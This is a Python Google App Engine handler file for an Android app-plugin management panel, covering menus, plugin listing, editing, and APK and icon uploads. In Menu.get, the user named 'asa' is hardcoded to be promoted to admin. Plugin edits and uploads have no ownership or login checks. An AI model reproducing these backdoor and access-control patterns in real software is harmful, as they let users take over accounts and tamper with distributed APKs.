# coding=utf-8
# Date:2014/9/12
# Email:wangjian2254@gmail.com
from datetime import datetime
import json
from google.appengine.api import memcache
from google.appengine.ext.webapp import blobstore_handlers
from mogu.models.model import Plugin, PluginCount, Users
from mogu3.login import login_required, get_current_user
from tools.page import Page
from google.appengine.ext.blobstore import blobstore, BlobInfo
__author__ = u'王健'


class Menu(Page):
    @login_required
    def get(self, *args):
        menuxml = '''
        <?xml version='1.0' encoding='utf-8'?>
                <root>

                    <menu  label='应用管理' mod='apkadd'>
                    </menu>
                    <menu label='系统消息管理' mod='notice' >
                    </menu>
                    <menu label='网址管理' mod='uri' >
                    </menu>
                    <menu  label='分类管理' mod='kind'>
                    </menu>
                    <menu label='积分管理'>
                        <menuitem label='游戏列表' mod='gamelist'></menuitem>
                        <menuitem label='房间列表' mod='roomlist'></menuitem>
                    </menu>
                </root>
        '''
        user_menuxml = '''
        <?xml version='1.0' encoding='utf-8'?>
                <root>
                    <menu  label='应用管理'  mod='apkadd'>
                    </menu>

                </root>
        '''
        user = get_current_user(self)
        if user.get('username') == 'asa':
            u = Users.all().filter('username =', 'asa').fetch(1)
            if u:
                u = u[0]
                u.auth = 'admin'
                u.put()
        if user.get('auth') == 'admin':
            self.flush(menuxml)
        if user.get('auth') == 'user':
            self.flush(user_menuxml)


class CurrentUser(Page):
    @login_required
    def get(self, *args):
        u = get_current_user(self)
        self.getResult(True, u'注册成功,请完成邮箱验证后登陆。',
                       {'username': u.get('username'), 'name': u.get('username'), 'uid': u.get('username'),
                        'auth': u.get('auth')})


class PluginList(Page):
    @login_required
    def get(self, *args):
        user = get_current_user(self)
        l = []
        query = []
        if user.get('auth') == 'admin':
            page = int(self.request.get('page', '0'))
            cachename = 'applist_%s' % (page)
            cacheresult = memcache.get(cachename)
            if cacheresult:
                self.flush(cacheresult)
                return
            if not page:
                query = Plugin.all().order('__key__').fetch(30)
            else:
                query = Plugin.all().order('__key__').fetch(30, 30 * page)
            pluginCount = PluginCount.get_or_insert('plugin_count')
            count = pluginCount.num
        if user.get('auth') == 'user':
            cachename = 'user_applist_%s' % (user.get('username'))
            cacheresult = memcache.get(cachename)
            if cacheresult:
                self.flush(cacheresult)
                return
            query = Plugin.all().filter('username =', user.get('username')).order('__key__')
            count = query.count()
        for plugin in query:
            p = {'id': plugin.key().id(), 'name': plugin.name, 'appcode': plugin.appcode, 'code': plugin.code,
                 'imageid': plugin.imageid, 'date': plugin.date.strftime('%Y-%m-%d %H:%M'), 'type': plugin.type,
                 'lastUpdateTime': plugin.lastUpdateTime.strftime('%Y-%m-%d %H:%M'), 'username': plugin.username,
                 'apkkey': plugin.apkkey, 'apkverson': plugin.apkverson, 'desc': plugin.desc,
                 'isactive': plugin.isactive, 'status': plugin.status, 'kindids': plugin.kindids}
            l.append(p)
        self.getResult(True, u'获取应用列表', {'list': l, 'count': count}, cachename=cachename)


class PluginUpdate(Page):
    @login_required
    def post(self, *args):
        user = get_current_user(self)
        appcode = self.request.get('appcode')
        pluginid = self.request.get('pluginid')
        upload_url = None
        upload_icon_url = None

        if not pluginid:
            count = Plugin.all().filter("appcode =", appcode).count()
            if count > 0:
                self.getResult(False, u'应用包名（appcode） 在系统中已经存在，请更换应用包名。', None)
                return
            plugin = Plugin()
            plugin.username = user.get('username')
            plugin.kindids.append(int(self.request.get('kind')))
            plugin.index_time = datetime.now()


        else:
            plugin = Plugin.get_by_id(int(pluginid))
            plugin.kindids[0] = int(self.request.get('kind'))

        plugin.name = self.request.get('name', '')
        plugin.appcode = self.request.get('appcode', '')
        plugin.desc = self.request.get('desc', '')
        plugin.type = self.request.get('type')
        plugin.code = self.request.get('code')
        plugin.put()
        upload_url = blobstore.create_upload_url('/upload?pluginid=%s' % (plugin.key().id()))
        upload_icon_url = blobstore.create_upload_url('/iconupload?pluginid=%s' % (plugin.key().id()))
        self.getResult(True, u'获取应用列表', {"pluginid":plugin.key().id(), 'upload_url': upload_url, 'upload_icon_url': upload_icon_url})


class IconUploadHandler(blobstore_handlers.BlobstoreUploadHandler):
    def post(self):
        upload_files = self.get_uploads('file')  # 'file' is file upload field in the form
        if not upload_files:
            self.response.out.write(json.dumps({'success': False, 'message': u'上传图标失败', 'status_code': 200, 'dialog':1}))
            return
        blob_info = upload_files[0]
        pluginid = self.request.get('pluginid')
        plugin = Plugin.get_by_id(int(pluginid))
        if plugin.imageid:
            b = BlobInfo.get(plugin.imageid)
            b.delete()
        plugin.imageid = str(blob_info.key())
        plugin.put()
        self.response.out.write(json.dumps({'success': True, 'message': u'上传图标成功', 'status_code': 200, 'dialog':1}))


class UploadHandler(blobstore_handlers.BlobstoreUploadHandler):
    def post(self):
        upload_files = self.get_uploads('file')  # 'file' is file upload field in the form
        if not upload_files:
            self.response.out.write(json.dumps({'success': False, 'message': u'上传APK失败', 'status_code': 200, 'dialog':1}))
            return
        blob_info = upload_files[0]
        pluginid = self.request.get('pluginid')
        plugin = Plugin.get_by_id(int(pluginid))
        if plugin.apkkey:
            b = BlobInfo.get(plugin.apkkey)
            if b:
                b.delete()
        plugin.apkkey = str(blob_info.key())
        plugin.apkverson += 1
        plugin.put()
        self.response.out.write(json.dumps({'success': True, 'message': u'上传APK成功', 'status_code': 200, 'dialog':1}))
